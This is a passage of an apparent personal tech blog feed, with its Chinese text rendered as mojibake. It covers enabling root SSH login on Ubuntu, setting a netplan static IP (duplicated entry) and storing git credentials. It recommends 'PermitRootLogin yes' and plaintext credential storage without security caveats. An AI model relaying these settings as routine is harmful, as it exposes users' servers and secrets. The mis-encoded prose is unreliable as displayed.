title="é—®é¢˜ï¼šå¯ä»¥è¿œç¨‹è¿æ¥æ™®é€šç”¨æˆ·(ningan)ï¼Œä½†æ˜¯å´ä¸å¯ä»¥è¿œç¨‹è¿æ¥rootç”¨æˆ·"></a>é—®é¢˜ï¼šå¯ä»¥è¿œç¨‹è¿æ¥æ™®é€šç”¨æˆ·(ningan)ï¼Œä½†æ˜¯å´ä¸å¯ä»¥è¿œç¨‹è¿æ¥rootç”¨æˆ·</h2><p>é…ç½®rootç”¨æˆ·SSHæœåŠ¡</p><p>Ubuntuä¸­SSHæœåŠ¡å®‰è£…å®ŒæˆåæŸ¥çœ‹æ˜¯å¦å…è®¸rootç”¨æˆ·ç™»é™†ï¼Œè‹¥ä¸å…è®¸åˆ™æ— æ³•è¿œç¨‹ç™»é™†rootç”¨æˆ·ï¼Œéœ€è¦ä¿®æ”¹é…ç½®</p><p>æ‰“å¼€â€œ&#x2F;etc&#x2F;ssh&#x2F;sshd_configâ€</p><p>sudo vim  &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><p>æ‰¾åˆ°å¹¶ç”¨#æ³¨é‡Šæ‰è¿™è¡Œï¼šPermitRootLogin prohibit-password</p><p>æŸ¥çœ‹æ˜¯å¦æœ‰â€œPermitRootLogin yesâ€æ–°å»ºä¸€è¡Œ æ·»åŠ ï¼šPermitRootLogin yes</p><p>é‡å¯æœåŠ¡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/ssh restart<br>systemctl restart ssh<br><br></code></pre></td></tr></table></figure><p>ç”¨rootè¿æ¥çš„æ—¶å€™ä¸€ç›´æ˜¾ç¤ºå¯†ç é”™è¯¯</p><p><strong>ä¿®æ”¹Ubuntuæ“ä½œç³»ç»Ÿrooté»˜è®¤å¯†ç </strong></p><p> ä¸€ã€Ubuntuçš„ é»˜è®¤rootå¯†ç æ˜¯éšæœºçš„ï¼Œå³æ¯æ¬¡å¼€æœºéƒ½æœ‰ä¸€ä¸ªæ–°çš„rootå¯†ç ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤ sudo passwdï¼Œç„¶åè¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç ï¼Œ enterï¼Œ</p><p> äºŒã€ç»ˆç«¯ä¼šæç¤ºæˆ‘ä»¬è¾“å…¥æ–°çš„å¯†ç å¹¶ç¡®è®¤ï¼Œæ­¤æ—¶çš„å¯†ç å°±æ˜¯rootæ–°å¯†ç ã€‚ä¿®æ”¹æˆåŠŸåï¼Œè¾“å…¥å‘½ä»¤ su rootï¼Œå†è¾“å…¥æ–°çš„å¯†ç å°±okäº†ã€‚ </p><p>å¯ä»¥æˆåŠŸè¿æ¥</p><p><img src="https://img-blog.csdnimg.cn/cd09fe53e108439ca4e13df258ab0972.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5a6J5a6JY3Nkbg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/howiecode/article/details/120457571">https://blog.csdn.net/howiecode/article/details/120457571</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘(202207) ubuntu20.04è®¾ç½®é™æ€ip</title>
    <link href="/2022/07/16/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/"/>
    <url>/2022/07/16/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/</url>
    
    <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>é—®é¢˜ï¼šsshè¿œç¨‹è¿æ¥çš„æ—¶å€™ï¼Œå‘ç°è¿ä¸ä¸Šè™šæ‹Ÿæœºã€‚åæ¥è¿›åˆ°è™šæ‹Ÿæœºé‡Œæ‰çœ‹åˆ°æ˜¯å› ä¸ºipåœ°å€å˜äº†ï¼Œæ‰€ä»¥æƒ³æ”¹æˆé™æ€ipã€‚</p><h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>è‡ª 17.10 å¼€å§‹ï¼ŒUbuntu å·²æ”¾å¼ƒåœ¨ &#x2F;etc&#x2F;network&#x2F;interfaces é‡Œè®¾ç½®é™æ€ IP çš„åŠæ³•äº†ï¼Œå³ä½¿é…ç½®ä¹Ÿä¸ä¼šç”Ÿæ•ˆï¼Œè€Œæ˜¯æ”¹æˆ netplan æ–¹å¼ ï¼Œé…ç½®å†™åœ¨ &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml æˆ–è€…ç±»ä¼¼åç§°çš„ yaml æ–‡ä»¶é‡Œ</p><p>Ubuntu20é…ç½®å€¼é™æ€ipæ—¶éœ€è¦ä¿®æ”¹&#x2F;etc&#x2F;netplanä¸‹é¢01-network-manager-all.yamlè¿™ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716164159864.png" alt="image-20220716164159864"></p><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><h3 id="æŸ¥çœ‹åŸå§‹ipåœ°å€"><a href="#æŸ¥çœ‹åŸå§‹ipåœ°å€" class="headerlink" title="æŸ¥çœ‹åŸå§‹ipåœ°å€"></a>æŸ¥çœ‹åŸå§‹ipåœ°å€</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165308432.png" alt="image-20220716165308432"></p><h3 id="è¦ä¿®æ”¹-x2F-etc-x2F-netplanä¸‹é¢01-network-manager-all-yamlè¿™ä¸ªæ–‡ä»¶"><a href="#è¦ä¿®æ”¹-x2F-etc-x2F-netplanä¸‹é¢01-network-manager-all-yamlè¿™ä¸ªæ–‡ä»¶" class="headerlink" title="è¦ä¿®æ”¹&#x2F;etc&#x2F;netplanä¸‹é¢01-network-manager-all.yamlè¿™ä¸ªæ–‡ä»¶"></a>è¦ä¿®æ”¹&#x2F;etc&#x2F;netplanä¸‹é¢01-network-manager-all.yamlè¿™ä¸ªæ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br>network:<br>  version: 2<br>  renderer: NetworkManager<br>  ethernets:<br>    eth0:                           <span class="hljs-comment"># é…ç½®ç½‘å¡çš„åç§°,é€šè¿‡ ip a å‘½ä»¤æŸ¥çœ‹</span><br>      dhcp4: <span class="hljs-literal">false</span>                    <span class="hljs-comment"># å…³é—­ DHCPï¼Œå¦‚æœéœ€è¦æ‰“å¼€ DHCP åˆ™å†™ true</span><br>      addresses: [172.24.48.67/20]    <span class="hljs-comment"># é…ç½®çš„é™æ€ IP åœ°å€å’Œæ©ç </span><br>      optional: <span class="hljs-literal">true</span><br>      gateway4: 172.24.48.1            <span class="hljs-comment"># ç½‘å…³åœ°å€</span><br>      nameservers:<br>        addresses: [8.8.8.8,114.114.114.114]       <span class="hljs-comment"># DNS æœåŠ¡å™¨åœ°å€ï¼Œå¤šä¸ª DNS æœåŠ¡å™¨åœ°å€éœ€è¦ç”¨è‹±æ–‡é€—å·åˆ†éš”å¼€</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>ç½‘å…³åœ°å€å¦‚ä½•ç¡®å®šå‘¢ï¼Ÿ</p><p>æˆ‘ç”¨çš„æ˜¯hyper-vå¯åŠ¨çš„è™šæ‹Ÿæœºï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165746966.png" alt="image-20220716165746966"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165911473.png" alt="image-20220716165911473"></p><h3 id="é‡å¯ç½‘ç»œ"><a href="#é‡å¯ç½‘ç»œ" class="headerlink" title="é‡å¯ç½‘ç»œ"></a>é‡å¯ç½‘ç»œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># netplan apply</span><br></code></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ"><a href="#æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ" class="headerlink" title="æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ"></a>æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ</h3><p>å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165204632.png" alt="image-20220716165204632"></p><p>å·²ç»ç”Ÿæ•ˆï¼</p><h3 id="æµ‹è¯•ç½‘ç»œè¿é€šæ€§"><a href="#æµ‹è¯•ç½‘ç»œè¿é€šæ€§" class="headerlink" title="æµ‹è¯•ç½‘ç»œè¿é€šæ€§"></a>æµ‹è¯•ç½‘ç»œè¿é€šæ€§</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165432286.png" alt="image-20220716165432286"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_56752399/article/details/115564741?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-115564741-blog-122279914.pc_relevant_sortByStrongTime&spm=1001.2101.3001.4242.2&utm_relevant_index=4">Ubuntu 20.10è®¾ç½®é™æ€IPåœ°å€</a><br><a href="https://blog.csdn.net/vincent_duan/article/details/120145526">Hyper-V å’ŒUbuntu Server 16.04 é…ç½®é™æ€IP</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€è™šæ‹Ÿæœºã€‘(202207) ubuntu20.04è®¾ç½®é™æ€ip</title>
    <link href="/2022/07/16/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/"/>
    <url>/2022/07/16/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/</url>
    
    <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>é—®é¢˜ï¼šsshè¿œç¨‹è¿æ¥çš„æ—¶å€™ï¼Œå‘ç°è¿ä¸ä¸Šè™šæ‹Ÿæœºã€‚åæ¥è¿›åˆ°è™šæ‹Ÿæœºé‡Œæ‰çœ‹åˆ°æ˜¯å› ä¸ºipåœ°å€å˜äº†ï¼Œæ‰€ä»¥æƒ³æ”¹æˆé™æ€ipã€‚</p><h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>è‡ª 17.10 å¼€å§‹ï¼ŒUbuntu å·²æ”¾å¼ƒåœ¨ &#x2F;etc&#x2F;network&#x2F;interfaces é‡Œè®¾ç½®é™æ€ IP çš„åŠæ³•äº†ï¼Œå³ä½¿é…ç½®ä¹Ÿä¸ä¼šç”Ÿæ•ˆï¼Œè€Œæ˜¯æ”¹æˆ netplan æ–¹å¼ ï¼Œé…ç½®å†™åœ¨ &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml æˆ–è€…ç±»ä¼¼åç§°çš„ yaml æ–‡ä»¶é‡Œ</p><p>Ubuntu20é…ç½®å€¼é™æ€ipæ—¶éœ€è¦ä¿®æ”¹&#x2F;etc&#x2F;netplanä¸‹é¢01-network-manager-all.yamlè¿™ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716164159864.png" alt="image-20220716164159864"></p><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><h3 id="æŸ¥çœ‹åŸå§‹ipåœ°å€"><a href="#æŸ¥çœ‹åŸå§‹ipåœ°å€" class="headerlink" title="æŸ¥çœ‹åŸå§‹ipåœ°å€"></a>æŸ¥çœ‹åŸå§‹ipåœ°å€</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165308432.png" alt="image-20220716165308432"></p><h3 id="è¦ä¿®æ”¹-x2F-etc-x2F-netplanä¸‹é¢01-network-manager-all-yamlè¿™ä¸ªæ–‡ä»¶"><a href="#è¦ä¿®æ”¹-x2F-etc-x2F-netplanä¸‹é¢01-network-manager-all-yamlè¿™ä¸ªæ–‡ä»¶" class="headerlink" title="è¦ä¿®æ”¹&#x2F;etc&#x2F;netplanä¸‹é¢01-network-manager-all.yamlè¿™ä¸ªæ–‡ä»¶"></a>è¦ä¿®æ”¹&#x2F;etc&#x2F;netplanä¸‹é¢01-network-manager-all.yamlè¿™ä¸ªæ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br>network:<br>  version: 2<br>  renderer: NetworkManager<br>  ethernets:<br>    eth0:                           <span class="hljs-comment"># é…ç½®ç½‘å¡çš„åç§°,é€šè¿‡ ip a å‘½ä»¤æŸ¥çœ‹</span><br>      dhcp4: <span class="hljs-literal">false</span>                    <span class="hljs-comment"># å…³é—­ DHCPï¼Œå¦‚æœéœ€è¦æ‰“å¼€ DHCP åˆ™å†™ true</span><br>      addresses: [172.24.48.67/20]    <span class="hljs-comment"># é…ç½®çš„é™æ€ IP åœ°å€å’Œæ©ç </span><br>      optional: <span class="hljs-literal">true</span><br>      gateway4: 172.24.48.1            <span class="hljs-comment"># ç½‘å…³åœ°å€</span><br>      nameservers:<br>        addresses: [8.8.8.8,114.114.114.114]       <span class="hljs-comment"># DNS æœåŠ¡å™¨åœ°å€ï¼Œå¤šä¸ª DNS æœåŠ¡å™¨åœ°å€éœ€è¦ç”¨è‹±æ–‡é€—å·åˆ†éš”å¼€</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>ç½‘å…³åœ°å€å¦‚ä½•ç¡®å®šå‘¢ï¼Ÿ</p><p>æˆ‘ç”¨çš„æ˜¯hyper-vå¯åŠ¨çš„è™šæ‹Ÿæœºï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165746966.png" alt="image-20220716165746966"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165911473.png" alt="image-20220716165911473"></p><h3 id="é‡å¯ç½‘ç»œ"><a href="#é‡å¯ç½‘ç»œ" class="headerlink" title="é‡å¯ç½‘ç»œ"></a>é‡å¯ç½‘ç»œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># netplan apply</span><br></code></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ"><a href="#æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ" class="headerlink" title="æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ"></a>æŸ¥çœ‹ç½‘å¡è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆ</h3><p>å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165204632.png" alt="image-20220716165204632"></p><p>å·²ç»ç”Ÿæ•ˆï¼</p><h3 id="æµ‹è¯•ç½‘ç»œè¿é€šæ€§"><a href="#æµ‹è¯•ç½‘ç»œè¿é€šæ€§" class="headerlink" title="æµ‹è¯•ç½‘ç»œè¿é€šæ€§"></a>æµ‹è¯•ç½‘ç»œè¿é€šæ€§</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165432286.png" alt="image-20220716165432286"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_56752399/article/details/115564741?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-115564741-blog-122279914.pc_relevant_sortByStrongTime&spm=1001.2101.3001.4242.2&utm_relevant_index=4">Ubuntu 20.10è®¾ç½®é™æ€IPåœ°å€</a><br><a href="https://blog.csdn.net/vincent_duan/article/details/120145526">Hyper-V å’ŒUbuntu Server 16.04 é…ç½®é™æ€IP</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€gitã€‘gitæ¯æ¬¡éƒ½è¦è¾“å…¥å¯†ç </title>
    <link href="/2022/05/22/git/%E3%80%90git%E3%80%91git%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/"/>
    <url>/2022/05/22/git/%E3%80%90git%E3%80%91git%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="windowså’Œlinuxä¸‹é¿å…git-cloneå’Œpushæ—¶æ¯æ¬¡éƒ½éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç "><a href="#windowså’Œlinuxä¸‹é¿å…git-cloneå’Œpushæ—¶æ¯æ¬¡éƒ½éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç " class="headerlink" title="windowså’Œlinuxä¸‹é¿å…git cloneå’Œpushæ—¶æ¯æ¬¡éƒ½éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç "></a>windowså’Œlinuxä¸‹é¿å…git cloneå’Œpushæ—¶æ¯æ¬¡éƒ½éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç </h1><p>git å¯ä»¥ç”¨ https æ–¹å¼è®¿é—®ä¹Ÿå¯ä»¥ç”¨ ssh æ–¹å¼è®¿é—®</p><p>1ï¼‰httpsï¼šå°±æ˜¯ä½ æ¯æ¬¡è¦è¾“å…¥å¯†ç é‚£ç§</p><p>2ï¼‰sshï¼šç”¨å…¬é’¥ç§é’¥  æœ¬åœ°ç”¨ssh-keygenç”Ÿæˆå¯†é’¥ï¼Œåˆ†ä¸º ç§é’¥å’Œå…¬é’¥ï¼Œç§é’¥æœ¬åœ°ä¿å­˜ï¼Œå…¬é’¥æ”¾åˆ°æœåŠ¡ç«¯</p><h2 id="æ–¹æ³•ä¸€ï¼šhttpsåè®®-é…ç½®å…¨å±€å¼€æœºå­˜å‚¨è®¤è¯ä¿¡æ¯"><a href="#æ–¹æ³•ä¸€ï¼šhttpsåè®®-é…ç½®å…¨å±€å¼€æœºå­˜å‚¨è®¤è¯ä¿¡æ¯" class="headerlink" title="æ–¹æ³•ä¸€ï¼šhttpsåè®® é…ç½®å…¨å±€å¼€æœºå­˜å‚¨è®¤è¯ä¿¡æ¯"></a>æ–¹æ³•ä¸€ï¼šhttpsåè®® é…ç½®å…¨å±€å¼€æœºå­˜å‚¨è®¤è¯ä¿¡æ¯</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/zhangxiaoyang0/article/details/69239734">windowsä¸‹git httpåè®®ä¿å­˜ç”¨æˆ·åå¯†ç </a></p><p>æ‰“å¼€ä¸ªäººæ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬ä¸ºC:\Documents and Settings\ç”¨æˆ·åï¼Œå…¶ä¸­æœ‰ä¸€ä¸ª.gitconfigçš„æ–‡ä»¶ï¼Œä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€ã€‚å¦‚æœä¹‹å‰é…ç½®äº†åå­—å’Œemailçš„è¯ï¼Œåœ¨è¿™é‡Œé¢ä¼šçœ‹åˆ°ã€‚</p><p>å¦‚ä½•æ·»åŠ é…ç½®å‘¢ï¼Ÿ</p><p>1ï¼‰æ‰“å¼€.gitconfigæ–‡ä»¶å¤¹ è¿½åŠ å¦‚ä¸‹é…ç½®</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[credential]</span><br><span class="hljs-attr">helper</span>=store<br></code></pre></td></tr></table></figure><p>2ï¼‰åœ¨ç»ˆç«¯(git bash)æ‰§è¡Œ   æ‰§è¡Œä¹‹åï¼Œå¯ä»¥çœ‹åˆ°~&#x2F;.gitconfigæ–‡ä»¶ï¼Œä¹Ÿä¼šå¤šäº†ä¸Šé¢é‚£é¡¹    ç›´æ¥åœ¨</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git config --<span class="hljs-keyword">global</span> credential.helper <span class="hljs-keyword">store</span> <br></code></pre></td></tr></table></figure><p>ä¸‹æ¬¡æˆ‘ä»¬å†æ¬¡è¾“å…¥ç”¨æˆ·åä¹‹åï¼Œ<a href="https://so.csdn.net/so/search?q=git&spm=1001.2101.3001.7020">git</a>å°±ä¼šè®°ä½ç”¨æˆ·åå¯†ç ï¼Œä»¥åå°±ä¸éœ€å†è¾“å…¥äº†ã€‚</p><p>è¿™æ—¶åœ¨ä¸Šè¿°é‚£ä¸ªç›®å½•åº•ä¸‹ï¼Œå¯å‘ç°ç”Ÿæˆå¦å¤–ä¸€ä¸ªæ–‡ä»¶.git-credentialsï¼Œé‡Œé¢è®°å½•çš„å°±æ˜¯ç”¨æˆ·å<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E7%A0%81&spm=1001.2101.3001.7020">å¯†ç </a>äº†ã€‚æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://&#123;username&#125;:&#123;password&#125;@github.com<br></code></pre></td></tr></table></figure><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>å‚è€ƒï¼š<a href="https://www.bbsmax.com/A/xl56WaDodr/">Linuxä¹‹è§£å†³æ¯æ¬¡git pull&#x2F;git pushéƒ½éœ€è¾“å…¥å¯†ç è®¾ç½®</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‰§è¡Œè¿™ä¸¤æ¡å‘½ä»¤</span><br><span class="hljs-built_in">cd</span> /   <span class="hljs-comment"># æˆ‘æ˜¯åœ¨/rootä¸‹é¢æ‰§è¡Œçš„ä¸‹é¢çš„è¿™ä¸ªå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘çš„.gitconfigå’Œ.git-credentialsæ–‡ä»¶æ˜¯åœ¨/rootä¸‹ç”Ÿæˆçš„</span><br>git config --global credential.helper store<br><br><span class="hljs-comment"># æ‰§è¡Œå®Œå‘½ä»¤ä¹‹åä¼šåœ¨.gitconfigæ–‡ä»¶ä¸­äº†ä¸‹é¢çš„å†…å®¹</span><br>[credential]<br>        helper = store<br><br><span class="hljs-built_in">cd</span>åˆ°é¡¹ç›®ç›®å½•ï¼Œæ‰§è¡Œgit pull,ä¼šæç¤ºè¾“å…¥è´¦å·å¯†ç ã€‚è¾“å®Œè¿™ä¸€æ¬¡ä»¥ågit pullæˆ–git pushå°±ä¸åœ¨éœ€è¦è¾“å…¥å¯†ç äº†ï¼ˆä¼šåœ¨æ ¹ç›®å½•ç”Ÿæˆä¸€ä¸ª .git-credentials æ–‡ä»¶ï¼‰<br><br>overï¼ï¼ï¼<br></code></pre></td></tr></table></figure><p>å…¶å®å’Œwindowsæ˜¯ä¸€æ ·çš„ï¼</p><h2 id="æ–¹æ³•äºŒï¼šsshåè®®"><a href="#æ–¹æ³•äºŒï¼šsshåè®®" class="headerlink" title="æ–¹æ³•äºŒï¼šsshåè®®"></a>æ–¹æ³•äºŒï¼šsshåè®®</h2><p>æœ¬åœ°ç”¨ssh-keygenç”Ÿæˆå¯†é’¥ï¼Œåˆ†ä¸º ç§é’¥å’Œå…¬é’¥ï¼Œç§é’¥æœ¬åœ°ä¿å­˜ï¼Œå…¬é’¥æ”¾åˆ°æœåŠ¡ç«¯</p><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># find / -name ssh-keygen</span><br>find: â€˜/run/user/1000/docâ€™: Permission denied<br>find: â€˜/run/user/1000/gvfsâ€™: Permission denied<br>/snap/core20/1587/usr/bin/ssh-keygen<br>/snap/core20/1587/usr/share/bash-completion/completions/ssh-keygen<br>/usr/share/bash-completion/completions/ssh-keygen<br>/usr/bin/ssh-keygen<br>[root@ubuntu-22 ~]<span class="hljs-comment">#</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># /usr/bin/ssh-keygen</span><br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/root/.ssh/id_rsa):<br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved <span class="hljs-keyword">in</span> /root/.ssh/id_rsa<br>Your public key has been saved <span class="hljs-keyword">in</span> /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:fyr7kENOycEK99SmHaYL3b5tPozhbvykX5ZNUtEai94 root@ubuntu-22<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|               ..|</span><br><span class="hljs-string">|       . .    . o|</span><br><span class="hljs-string">|    . . + =  . +.|</span><br><span class="hljs-string">|     o * X .. o. |</span><br><span class="hljs-string">|      o S o. .. .|</span><br><span class="hljs-string">|       = =. . E= |</span><br><span class="hljs-string">|        *oo+o + .|</span><br><span class="hljs-string">|        .o=B+o   |</span><br><span class="hljs-string">|        .**==.   |</span><br><span 